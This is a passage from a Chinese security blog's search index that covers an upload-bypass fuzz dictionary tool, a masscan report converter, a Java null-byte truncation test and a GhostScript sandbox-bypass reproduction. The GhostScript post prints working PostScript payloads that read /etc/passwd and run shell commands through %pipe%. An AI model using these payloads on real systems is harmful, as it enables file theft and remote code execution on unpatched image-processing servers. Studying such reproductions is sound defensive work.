class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_double_suffix_creater</span><span class="params">(list_suffix)</span>:</span></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> list_suffix:</span><br><span class="line">res += double_suffix_creater(l)</span><br><span class="line"><span class="keyword">return</span> duplicate_removal(res)</span><br></pre></td></tr></table></figure><h2 id="八、整合代码"><a href="#八、整合代码" class="headerlink" title="八、整合代码"></a>八、整合代码</h2><p>上面我们针对和上传漏洞相关的每个方面进行了细致的分析，也提供了相关的核心代码。最终整合后的代码限于边幅，就放在github上了。</p><p><strong>github：<a href="https://github.com/c0ny1/upload-fuzz-dic-builder" target="_blank" rel="noopener">https://github.com/c0ny1/upload-fuzz-dic-builder</a></strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ python upload-fuzz-dic-builder.py -h</span><br><span class="line">usage: upload-fuzz-dic-builder [-h] [-n] [-a] [-l] [-m] [--os] [-d] [-o]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line">  -n , --upload-filename</span><br><span class="line">                        Upload file name</span><br><span class="line">  -a , --allow-suffix   Allowable upload suffix</span><br><span class="line">  -l , --language       Uploaded script language</span><br><span class="line">  -m , --middleware     Middleware used in Web System</span><br><span class="line">  --os                  Target operating system type</span><br><span class="line">  -d, --double-suffix   Is it possible to generate double suffix?</span><br><span class="line">  -o , --output         Output file</span><br></pre></td></tr></table></figure><p>脚本可以之定义生成的上传文件名（-n），允许的上传的后缀（-a），后端语言（-l），中间件(-m),操作系统（–os），是否加入双后缀（-d）以及输出的字典文件名（-o）。我们可以根据场景来生成合适的字典，提供的信息越详细，脚本生成的字典越精确。</p><h2 id="九、案例"><a href="#九、案例" class="headerlink" title="九、案例"></a>九、案例</h2><p><a href="https://github.com/c0ny1/upload-labs" target="_blank" rel="noopener">upload-labs</a>靶场的Pass0-3到Pass-10其实都是关于后缀的，在不知道代码的情况下，我们如何快速发现可以绕过的后缀呢？这时我们就可以使用<code>upload-fuzz-dic-builder.py</code>脚本生成fuzz字典，来进行fuzz。这里我选择Pass-09来给大家演示。</p><h4 id="1-利用脚本生成fuzz字典。"><a href="#1-利用脚本生成fuzz字典。" class="headerlink" title="1.利用脚本生成fuzz字典。"></a>1.利用脚本生成fuzz字典。</h4><p>由于知道我们的后端语言为<code>php</code>,中间件为<code>apache</code>，操作系统为<code>Windows</code>。所以可以利用这些信息生成更精确的fuzz字典。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python upload-fuzz-dic-builder.py -l php -m apache --os win</span><br><span class="line">[+] 收集17条可解析后缀完毕！</span><br><span class="line">[+] 加入145条可解析后缀大小写混合完毕！</span><br><span class="line">[+] 加入152条中间件漏洞完毕！</span><br><span class="line">[+] 加入37条.htaccess完毕！</span><br><span class="line">[+] 加入10336条系统特性完毕！</span><br><span class="line">[+] 去重后共10753条数据写入upload_fuzz_dic.txt文件</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/make-upload-vul-fuzz-dic/upload_fuzz_dic.png" alt="图1-生成的字典"></p><h4 id="2-抓包使用burp的Intruder模块对上传名称进行fuzz"><a href="#2-抓包使用burp的Intruder模块对上传名称进行fuzz" class="headerlink" title="2.抓包使用burp的Intruder模块对上传名称进行fuzz"></a>2.抓包使用burp的Intruder模块对上传名称进行fuzz</h4><p>抓取upload-labs的Pass-09的上传包，发送到Intruder模块，加载第一步脚本生成的fuzz字典，对上传的包的文件名进行fuzz。</p><p><img src="/articles/2018/make-upload-vul-fuzz-dic/fuzz_result.png" alt="图2-fuzz结果"></p><p>经过测试，通过fuzz可以快速找到可以突破upload-labs那些基于后缀的Pass的payload。甚至fuzz出同一个Pass多种绕过的方法。</p><p><strong>本文已在freebuf上首发：<a href="https://www.freebuf.com/articles/web/188464.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/188464.html</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编写masscan报告转换脚本</title>
      <link href="/articles/2018/masscan-report-converter/"/>
      <url>/articles/2018/masscan-report-converter/</url>
      
        <content type="html"><![CDATA[<p>由于nmap扫描比较慢，有时候需要使用masscan对大段ip进行快速扫描。为了后续方便数据处理，往往需要将数据以xls的形式进行统计，但是masscan只支持xml,json,list等格式输出,并不支持直接输出xls格式。最近有正好这个需求，于是写了个小脚本来转换一下。</p><h2 id="一、编码"><a href="#一、编码" class="headerlink" title="一、编码"></a>一、编码</h2><h4 id="file-masscan-report-converter-py"><a href="#file-masscan-report-converter-py" class="headerlink" title="file: masscan-report-converter.py"></a>file: masscan-report-converter.py</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> xml.dom.minidom</span><br><span class="line"><span class="keyword">import</span> xlsxwriter</span><br><span class="line"><span class="keyword">from</span> xlsxwriter <span class="keyword">import</span> Workbook</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">author: c0ny1</span></span><br><span class="line"><span class="string">date: 2018-09-28 18:23</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_masscan_report</span><span class="params">(xml_path,xls_path)</span>:</span></span><br><span class="line">workbook = xlsxwriter.Workbook(xls_path)</span><br><span class="line">worksheet = workbook.add_worksheet(<span class="string">'Scan info'</span>)</span><br><span class="line">worksheet.autofilter(<span class="string">"A1:H1"</span>)  <span class="comment">#设置过滤</span></span><br><span class="line">worksheet.freeze_panes(<span class="number">1</span>, <span class="number">0</span>)  <span class="comment">#冻结窗格</span></span><br><span class="line"></span><br><span class="line">worksheet.lastrow = <span class="number">0</span></span><br><span class="line">summary_header = [<span class="string">"addr"</span>, <span class="string">"port"</span>, <span class="string">"state"</span>, <span class="string">"protocol"</span>, <span class="string">"addrtype"</span>, <span class="string">"reason"</span>, <span class="string">"reason_ttl"</span>, <span class="string">"scan_endtime"</span>]</span><br><span class="line"><span class="keyword">for</span> idx, item <span class="keyword">in</span> enumerate(summary_header):</span><br><span class="line">worksheet.write(<span class="number">0</span>, idx, item,workbook.add_format(&#123;<span class="string">"bold"</span>: <span class="literal">True</span>&#125;))</span><br><span class="line">worksheet.lastrow += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">DOMTree = xml.dom.minidom.parse(xml_path) </span><br><span class="line">data = DOMTree.documentElement</span><br><span class="line">nodelist = data.getElementsByTagName(<span class="string">'host'</span>)</span><br><span class="line">host_info = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> nodelist:</span><br><span class="line">scan_endtime = node.getAttribute(<span class="string">'endtime'</span>)</span><br><span class="line">scan_endtime = time.strftime(<span class="string">'%Y-%m-%d %H:%M:%S'</span>,time.localtime(int(scan_endtime)))</span><br><span class="line">address_node = node.getElementsByTagName(<span class="string">'address'</span>)</span><br><span class="line">addrtype = address_node[<span class="number">0</span>].getAttribute(<span class="string">'addrtype'</span>)</span><br><span class="line">addr = address_node[<span class="number">0</span>].getAttribute(<span class="string">'addr'</span>)</span><br><span class="line">port_node = node.getElementsByTagName(<span class="string">'port'</span>)</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> port_node:</span><br><span class="line">protocol = port.getAttribute(<span class="string">'protocol'</span>)</span><br><span class="line">portid = port.getAttribute(<span class="string">'portid'</span>)</span><br><span class="line">state_element = port.getElementsByTagName(<span class="string">'state'</span>)</span><br><span class="line">state = state_element[<span class="number">0</span>].getAttribute(<span class="string">'state'</span>)</span><br><span class="line">reason = state_element[<span class="number">0</span>].getAttribute(<span class="string">'reason'</span>)</span><br><span class="line">reason_ttl = state_element[<span class="number">0</span>].getAttribute(<span class="string">'reason_ttl'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] | %s | %s | %s | %s | %s | %s | %s | %s |'</span> % (addr,portid,state,protocol,addrtype,reason,reason_ttl,scan_endtime)</span><br><span class="line">scan_info = [addr,portid,state,protocol,addrtype,reason,reason_ttl,scan_endtime]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(scan_info)):</span><br><span class="line">worksheet.write(worksheet.lastrow, i, scan_info[i])</span><br><span class="line">worksheet.lastrow += <span class="number">1</span></span><br><span class="line">workbook.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">"-i"</span>, <span class="string">"--input"</span>, metavar=<span class="string">"XML"</span>, help=<span class="string">"path to xml input"</span>)</span><br><span class="line">parser.add_argument(<span class="string">"-o"</span>, <span class="string">"--output"</span>, metavar=<span class="string">"XLS"</span>, help=<span class="string">"path to xlsx output"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">sys.argv.append(<span class="string">'-h'</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.input:</span><br><span class="line">xml_path = args.input</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">exit(<span class="string">'[*] please use -i set xml path!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.lexists(xml_path) == <span class="literal">False</span>:</span><br><span class="line">exit(<span class="string">'[*] %s does not exist!'</span>,xml_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.output:</span><br><span class="line">xls_path = args.output</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">xls_path = <span class="string">'./masscan_report.xls'</span></span><br><span class="line"></span><br><span class="line">convert_masscan_report(xml_path,xls_path)</span><br></pre></td></tr></table></figure><p>目前脚本已经收集到我的WorkScript项目中，地址如下：</p><p><a href="https://github.com/c0ny1/WorkScripts/tree/master/masscan-report-converter" target="_blank" rel="noopener">https://github.com/c0ny1/WorkScripts/tree/master/masscan-report-converter</a></p><h2 id="二、使用步骤"><a href="#二、使用步骤" class="headerlink" title="二、使用步骤"></a>二、使用步骤</h2><h5 id="1-使用masscan进行扫描，扫描结果以xml保存"><a href="#1-使用masscan进行扫描，扫描结果以xml保存" class="headerlink" title="1.使用masscan进行扫描，扫描结果以xml保存"></a>1.使用masscan进行扫描，扫描结果以xml保存</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan.exe -p21,22,23,80,7001,5900 10.0.0.0/8 --rate=100000 -oX scan_result.xml</span><br></pre></td></tr></table></figure><h5 id="2-使用上面写的脚本转换出xls格式的报告"><a href="#2-使用上面写的脚本转换出xls格式的报告" class="headerlink" title="2.使用上面写的脚本转换出xls格式的报告"></a>2.使用上面写的脚本转换出xls格式的报告</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan-report-converter.py -i scan_result.xml -o scan_result.xls</span><br></pre></td></tr></table></figure><p>最终效果如下：</p><p><img src="/articles/2018/masscan-report-converter/convert_result.png" alt="图1-脚本转换后的报告"></p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从代码层面理解java的00截断漏洞</title>
      <link href="/articles/2018/java-00-truncation/"/>
      <url>/articles/2018/java-00-truncation/</url>
      
        <content type="html"><![CDATA[<p>我们一般研究00截断，基本都是使用php来写的漏洞demo。所以都知道php下的00截断是和<code>move_upload_file()</code>这个函数有关，和这个漏洞相关的CVE有两个（CVE-2006-7243和CVE-2015-2348 ）。但搜索了网上的资料，发现对java的00截断的研究文章甚少。 <strong>完全搞不清在java中这个漏洞是和系统，中间件，jdk，还是代码有关？如果是代码问题，那是某个函数存在漏洞呢，还是代码逻辑问题？</strong></p><h2 id="一、实验编码"><a href="#一、实验编码" class="headerlink" title="一、实验编码"></a>一、实验编码</h2><p>在系统c盘根目录新建两个文件，分别如下：</p><h4 id="1-1-test-jsp"><a href="#1-1-test-jsp" class="headerlink" title="1.1 test.jsp"></a>1.1 test.jsp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this is test.jsp</span><br></pre></td></tr></table></figure><h4 id="1-2-test-txt"><a href="#1-2-test-txt" class="headerlink" title="1.2 test.txt"></a>1.2 test.txt</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this is test.txt</span><br></pre></td></tr></table></figure><h4 id="1-3-测试代码"><a href="#1-3-测试代码" class="headerlink" title="1.3 测试代码"></a>1.3 测试代码</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.URLDecoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">T1</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">String path = <span class="string">"c://test.jsp"</span>+URLDecoder.decode(<span class="string">"%00"</span>)+<span class="string">"test.txt"</span>;</span><br><span class="line">System.out.println(<span class="string">"filename:"</span> + path);</span><br><span class="line">File file = <span class="keyword">new</span> File(path);</span><br><span class="line">System.out.print(<span class="string">"content:"</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">FileInputStream fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"><span class="keyword">int</span> b;</span><br><span class="line"><span class="keyword">while</span>((b = fis.read()) != -<span class="number">1</span>)&#123;</span><br><span class="line">System.out.print((<span class="keyword">char</span>)b);</span><br><span class="line">&#125;</span><br><span class="line">fis.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、测试结果"><a href="#二、测试结果" class="headerlink" title="二、测试结果"></a>二、测试结果</h2><p>jdk1.6.0</p><p><img src="/articles/2018/java-00-truncation/test_in_jdk1.6.png" alt></p><p>jdk1.7.0</p><p><img src="/articles/2018/java-00-truncation/test_in_jdk1.7.png" alt></p><p>jdk1.7.08（最新的1.7版本）</p><p><img src="/articles/2018/java-00-truncation/test_in_jdk1.7.0_80.png" alt></p><h2 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h2><p>目前的结论：java的00截断和jdk版本有关。漏洞更深层次的原理，我会在代码审计完，进行更细致的研究，到时候更新文章。最后感谢公司背影表哥的指点。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 00截断 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GhostScript沙箱绕过命令执行漏洞复现</title>
      <link href="/articles/2018/ghostscript-rce-20180821/"/>
      <url>/articles/2018/ghostscript-rce-20180821/</url>
      
        <content type="html"><![CDATA[<h2 id="一、漏洞信息"><a href="#一、漏洞信息" class="headerlink" title="一、漏洞信息"></a>一、漏洞信息</h2><table><thead><tr><th align="left">项目</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">漏洞名称</td><td align="left">GhostScript 沙箱绕过（命令执行）漏洞</td></tr><tr><td align="left">漏洞作者</td><td align="left">Tavis Ormandy</td></tr><tr><td align="left">CVE编号</td><td align="left">暂未分配</td></tr><tr><td align="left">漏洞描述</td><td align="left">攻击者利用此漏洞可以上传恶意构造的图像文件，当目标服务器在对图像进行裁剪、转换等处理时即会执行攻击者指定的命令。</td></tr><tr><td align="left">影响范围</td><td align="left">&lt;= 9.23（全版本，全平台）</td></tr><tr><td align="left">披露时间</td><td align="left">2018-08-21</td></tr></tbody></table><h2 id="二、复现环境"><a href="#二、复现环境" class="headerlink" title="二、复现环境"></a>二、复现环境</h2><ul><li>OS：Ubuntu 14.10</li><li>Ghostscript version：9.23（当下最新版本）</li><li>Imagemagic version：7.0.8（当下最新版本）</li></ul><h2 id="三、环境搭建"><a href="#三、环境搭建" class="headerlink" title="三、环境搭建"></a>三、环境搭建</h2><h4 id="3-1-安装Ghostscript"><a href="#3-1-安装Ghostscript" class="headerlink" title="3.1 安装Ghostscript"></a>3.1 安装Ghostscript</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">c0ny1@Ubuntu ~$ <span class="built_in">cd</span> /usr/<span class="built_in">local</span></span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ wget https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23.tar.gz</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ tar zxvf ghostscript-9.23.tar.gz</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ <span class="built_in">cd</span> ghostscript-9.23</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ ./configure --prefix=/usr</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ mkdir obj</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ mkdir bin</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ make all</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ sudo make install</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ghostscript-9.23$ gs -v <span class="comment">#检查是否安装成功</span></span><br><span class="line">GPL Ghostscript 9.23 (2018-03-21)</span><br><span class="line">Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.</span><br></pre></td></tr></table></figure><h4 id="3-2-安装Imagemagic"><a href="#3-2-安装Imagemagic" class="headerlink" title="3.2 安装Imagemagic"></a>3.2 安装Imagemagic</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ wget https://github.com/ImageMagick/ImageMagick/archive/7.0.8-9.tar.gz</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ tar zxvf 7.0.8-9.tar.gz</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>$ <span class="built_in">cd</span> ImageMagick-7.0.8-9/</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ ./configure --prefix=/usr</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ make</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ make install</span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ sudo ldconfig /usr/<span class="built_in">local</span>/lib <span class="comment">#使用新增的动态链接库生效</span></span><br><span class="line">c0ny1@Ubuntu /usr/<span class="built_in">local</span>/ImageMagick-7.0.8-9$ convert -version <span class="comment">#检查是否安装成功</span></span><br><span class="line">Version: ImageMagick 7.0.8-9 Q16 i686 2018-08-26 https://www.imagemagick.org</span><br><span class="line">Copyright: ? 1999-2018 ImageMagick Studio LLC</span><br><span class="line">License: https://www.imagemagick.org/script/license.php</span><br><span class="line">Features: Cipher DPC HDRI OpenMP </span><br><span class="line">Delegates (built-in):</span><br></pre></td></tr></table></figure><h2 id="四、漏洞验证"><a href="#四、漏洞验证" class="headerlink" title="四、漏洞验证"></a>四、漏洞验证</h2><h4 id="4-1-读文件"><a href="#4-1-读文件" class="headerlink" title="4.1 读文件"></a>4.1 读文件</h4><p>读取/etc/passwd文件内容的poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">/FileToSteal (/etc/passwd) def</span><br><span class="line">errordict /undefinedfilename &#123;</span><br><span class="line">    FileToSteal % save the undefined name</span><br><span class="line">&#125; put</span><br><span class="line">errordict /undefined &#123;</span><br><span class="line">    (STOLEN: ) print</span><br><span class="line">    counttomark &#123;</span><br><span class="line">        ==only</span><br><span class="line">    &#125; repeat</span><br><span class="line">    (\n) print</span><br><span class="line">    FileToSteal</span><br><span class="line">&#125; put</span><br><span class="line">errordict /invalidfileaccess &#123;</span><br><span class="line">    pop</span><br><span class="line">&#125; put</span><br><span class="line">errordict /typecheck &#123;</span><br><span class="line">    pop</span><br><span class="line">&#125; put</span><br><span class="line">FileToSteal (w) .tempfile</span><br><span class="line">statusdict</span><br><span class="line">begin</span><br><span class="line">    1 1 .setpagesize</span><br><span class="line">end</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>将以上poc保存为poc.ps文件，并执行以下命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gs -q -sDEVICE=ppmraw -dSAFER  poc.ps</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/ghostscript-rce-20180821/gs_read_passwd.png" alt="图1-执行结果"></p><h4 id="4-2命令执行"><a href="#4-2命令执行" class="headerlink" title="4.2命令执行"></a>4.2命令执行</h4><p>ubuntu poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure><p>centos poc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">legal</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></figure><p>这里我们是linux是Ubuntu发行版，故选择第一个poc进行测试。将以上poc保存为poc.jpg文件，并执行以下命令,测试对恶意图片文件进行格式转换。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/bin/convert poc.jpg poc.jpg</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/ghostscript-rce-20180821/imagemagic_convert.png" alt="图2-执行结果"></p><p><strong>注意：</strong> 漏洞作者的<a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">《More Ghostscript Issues: Should we disable PS coders in policy.xml by default?》</a>这篇文章里的convert命令不是ghostscript的，而是它的上游应用。可以是imagemagick，也可以是graphicsmagick。经过测试两个软件的convert命令都存在漏洞,我们这里复测的事imagemagick。</p><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>ghostscript的上游应用有imagemagick，libmagick，graphicsmagick，gimp，python-matplotlib，texlive-core，texmacs，latex2html，latex2rtf等，其中ImageMagick受该漏洞影响最为严重。有相当多的网站，博客，媒体平台和流行的CMS（WordPress，Drupal等）在使用ImageMagick来进行图像处理。 <strong>故在日常渗透测试中，可以上传带有dnslog测试的poc，来测试目标网站是否存在该漏洞。</strong></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://github.com/vulhub/vulhub/tree/master/ghostscript/9.23-rce" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/ghostscript/9.23-rce</a></li><li><a href="http://seclists.org/oss-sec/2018/q3/142" target="_blank" rel="noopener">More Ghostscript Issues: Should we disable PS coders in policy.xml by default?</a></li><li><a href="http://www.cnblogs.com/ermei/p/9520184.html" target="_blank" rel="noopener">imagemaick的ghost script RCE漏洞</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复测 </tag>
            
            <tag> GhostScript </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS中的JS转义和HTML转义</title>
      <link href="/articles/2018/escape-string-in-xss/"/>
      <url>/articles/2018/escape-string-in-xss/</url>
      
